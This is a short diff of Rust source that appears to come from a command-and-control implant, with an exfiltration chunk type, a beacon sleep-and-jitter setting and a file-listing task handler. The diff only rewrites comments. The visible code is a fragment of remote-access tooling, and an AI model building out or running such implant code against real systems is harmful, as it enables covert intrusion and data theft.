@@ -6,9 +6,9 @@ use crate::profile::parse_duration;
 use crate::wire::ExfilChunk;
 
 // The verb registry: string-in, string-out handlers over the shared task
-// grammar, the same argument shapes the .NET reference implant documents
-// (Files.cs, Exec.cs, BeaconSleep.cs) so operator muscle memory and the UI
-// carry across implants unchanged.
+// grammar, with the argument shapes the operator console and the capability
+// documentation carry, so muscle memory and the UI work the same on every
+// implant.
 
 /// The live cadence a beacon.sleep retune mutates (sleep seconds, jitter
 /// half-width seconds).
@@ -214,8 +214,8 @@ fn fs_list(arguments: &str) -> HandlerOutput {
         let name = entry.file_name().to_string_lossy().into_owned();
         let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
         let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
-        // One JSON object per line, the shape the .NET fs.list emits so the
-        // operator UI's line parser reads either implant.
+        // One JSON object per line, the line shape the operator console's
+        // listing parser reads.
         lines.push(format!(
             "{{\"name\":\"{}\",\"dir\":{},\"size\":{}}}",
             name.replace('\\', "\\\\").replace('"', "\\\""),
